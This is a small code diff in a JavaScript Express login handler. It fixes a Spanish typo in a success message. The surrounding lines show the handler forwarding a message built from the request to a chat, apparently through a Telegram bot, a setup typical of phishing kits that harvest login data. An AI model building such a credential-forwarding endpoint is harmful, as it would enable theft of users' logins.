@@ -27,7 +27,7 @@ app.post("/login", async (req, res) => {
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    res.send("✅ Hemos recibido tu solicitu.");
+    res.send("✅ Hemos recibido tu solicitud.");
   } catch (error) {
     console.error(error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
